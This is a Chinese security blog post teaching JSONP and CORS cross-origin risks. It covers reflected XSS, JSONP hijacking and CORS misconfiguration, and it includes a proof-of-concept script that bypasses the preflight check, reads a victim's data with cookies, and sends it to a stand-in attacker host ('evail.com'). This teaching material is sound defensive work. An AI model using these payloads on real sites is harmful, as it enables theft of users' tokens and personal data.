+<h1 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h1><p>   在企业级应用开发中，经常会遇到跨域数据交互的问题，例如多个子集应用之间通过跨域获取用户登录状态及身份信息等，从而能够满足现代web应用中的实际需求。因此谈到跨域就要了解下浏览器的同源策略。<br>   浏览器的同源策略（Same Origin Policy,SOP）,同源要求两个页面具有相同的协议、域名、端口号。当A应用(<a href="https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口" target="_blank" rel="noopener">https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口</a>(提交操作）或者读取接口返回的数据作进一步的处理的话，这时就需要考虑跨域问题了，一般情况下浏览器会阻止这种不安全的跨域行为。但在html语言中，有些标签是具备天然的跨域功能的，比如&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;等标签是可以直接跨域请求其它域的资源的，这就催生了JSONP(JSON with Padding)，JSONP本质上是利用了&lt;script&gt;标签的跨域能力。</p>
+<h2 id="JSONP跨域安全开发实践方面"><a href="#JSONP跨域安全开发实践方面" class="headerlink" title="JSONP跨域安全开发实践方面"></a>JSONP跨域安全开发实践方面</h2><p>a.com 想要跨域读取b.com下的/getinfo的返回数据，a.com前端示例代码如下：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span><span class="params">(msg)</span></span>{      </span><br><span class="line"> <span class="keyword">do</span> something();<span class="comment">//回调函数，自定义读取数据后续操作    </span></span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src =<span class="string">"http://b.com/getinfo?callback=jsonp_callback"</span> type=<span class="string">"text/javascript"</span> &gt;&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p>b.com后台示例代码如下 </p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=<span class="string">"/getinfo"</span>,method=RequestMethod.GET)</span><br><span class="line">@ResponseBody</span><br><span class="line"><span class="keyword">public</span> String getToken(@RequestParam(<span class="string">"callback"</span>) String callbackFunction){  </span><br><span class="line"><span class="keyword">return</span> callbackFunction+<span class="string">"{\"result\":{\"data\":{\"token\":\"18623163885dedec5decbab1.37745340\"}}};"</span>;</span><br><span class="line">    </span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+<p>则此时 而此时b.com 响应报文返回的json数据为：jsonp_callback({“result”:{“data”:{“token”:”18623163885dedec5decbab1.37745340”}}});然后a.com能够获取返回的数据</p>
+<hr>
+<h2 id="jsonp开发实践中经常会出现的一些问题"><a href="#jsonp开发实践中经常会出现的一些问题" class="headerlink" title="jsonp开发实践中经常会出现的一些问题"></a>jsonp开发实践中经常会出现的一些问题</h2><ol>
+<li><p>未正确设置响应报文头Content-Type 而导致的反射型XSS一般来说，默认的响应报文头<code>Content-Type:text/html</code>，则此时容易产生反射型xss，从而进一步获取数据。因此我们可通过设置Content-Type为<code>application/json</code>指明返回的报文体是json格式的，避免浏览器解析执行。这个主要是后端是根据前面传入的callback参数的，因此可能导致反射型xss 。</p>
+</li>
+<li><p>JSONP劫持：有些web应用，尤其是同域名下的不同子域之间，通过JSONP方式传输敏感信息，例如用户信息、支付信息、鉴权token等，就要关注JSONP劫持问题了。</p>
+</li>
+</ol>
+<p>一个简单的劫持的代码片段，对于这种jsonp劫持问题，一般企业是对返回的数据做了脱敏处理。尤其对于 姓名 身份证号 手机号 银行卡号之类的个人敏感信息一般只保留其中的几个字符，其他用*号代替。</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span>(<span class="params">msg</span>)</span>{      </span><br><span class="line">   <span class="comment">//alert(msg);        </span></span><br><span class="line">   do_evilSomething();<span class="comment">//发送敏感数据  }</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src =http:/</span><span class="regexp">/b.com/g</span>etinfo?callback=jsonp_callback type=<span class="string">"text/javascript"</span> &gt; <span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure>
+<p>不得不提到，JSONP跨域数据传输只能通过GET方式，下面再介绍另外一种跨域方法—CORS。</p>
+<hr>
+<h2 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h2><p>   我们常说的跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。但是浏览器决定是否阻断此次请求是要看被跨域请求的网站（b.com）的返回头header中是否包含“授权访问标头”—Access-Control-Allow-Origin。</p>
+<p>一个cors请求代码示例：</p>
+<p><img src="https://img-blog.csdnimg.cn/20200515155329679.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515155343926.png" alt="在这里插入图片描述"><br>   响应中响应首部字段 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 的访问，该首部字段的内容如下：Access-Control-Allow-Origin: <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 。</p>
+<p>   当然这次请求会成功，但是当我们把上面的代码片段中:<br>xmlhttp.setRequestHeader(“Content-Type”,”application/json”);<br>我们会发现浏览器会多一步操作就是先发送一个 OPTIONS方法请求，通常也称为预请求。火狐等浏览器规定是以下情况的请求需要先进行“预检”。<br>   当请求满足下述任一条件时，即应首先发送预检请求：<br>Content-Type 的值不属于下列之一:</p>
+<blockquote>
+<p>application/x-www-form-urlencoded<br>multipart/form-data<br>text/plain</p>
+</blockquote>
+<p>   使用了下面任一 HTTP 方法：<code>PUT DELETE CONNECT OPTIONS TRACE PATCH</code>，还有人为设置了对 CORS 安全的首部字段集合之外的其他首部字段等。如果需要跨域请求带上被请求域的Cookie，则需要响应中响应首部字段：<code>Access-Control-Allow-Credentials: true</code> ，但同时浏览器为了安全起见，同时和<code>Access-Control-Allow-Origin: *</code>使用请求会被直接阻断。</p>
+<h2 id="CORS中开发误配置所导致的安全问题："><a href="#CORS中开发误配置所导致的安全问题：" class="headerlink" title="CORS中开发误配置所导致的安全问题："></a>CORS中开发误配置所导致的安全问题：</h2><p>（1）Access-Control-Allow-Origin 误配置获取敏感数据<br>一般有些应用确实不允许跨域，但若web中间件（例如nginx）上被误配置（尤其和其它应用使用同一个nginx做反向代理【add_header ‘Access-Control-Allow-Origin’ $origin;】）就会造成本级应用被强制允许跨域。<br>(2）本级应用允许跨域，但编写正则可绕过<br>(3)    绕过预检请求的写操作CSRF<br>   假如应用A与应用B的某个接口之间(数据传输使用json格式)存在跨域资源共享，但应用B未校验Content-Type，因此可通过XMLHttpRequest设置<code>Content-Type为"text/plain"</code>绕过预检请求<br>   携带cookie发送请求报文到B的服务端。（若浏览器发现B返回的报文头没有<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials: true</code>字段，则不允许读取返回的数据）</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonreq</span>(<span class="params"></span>) </span>{</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"https://www.b.com/getuserinfo"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"text/plain"</span>);<span class="comment">//注意这里</span></span><br><span class="line">xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{ </span><br><span class="line"><span class="keyword">var</span> res= xhr.responseText; <span class="comment">// 读取返回的数据 </span></span><br><span class="line">location=<span class="string">'http://evail.com?param='</span>+res; </span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line">jsonreq();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></tbody></table></figure>
+<hr>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">SummerSec</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/">https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">SummerSec</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="逆向学习fastjson反序列化始">
+                        
+                        <span class="card-title">逆向学习fastjson反序列化始</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java/">
+                        <span class="chip bg-color">反序列化 Java</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%A2%98/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/20.jpg" class="responsive-img" alt="记一次面试题">
+                        
+                        <span class="card-title">记一次面试题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Here's something encrypted, password is required to continue reading.
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    笔记
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.5'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2018-2021</span>
+            
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">SummerSec</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">112k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2018";
+                    var startMonth = "6";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/SummerSec" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:summersec@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/SecSummers" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/SecSummers" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
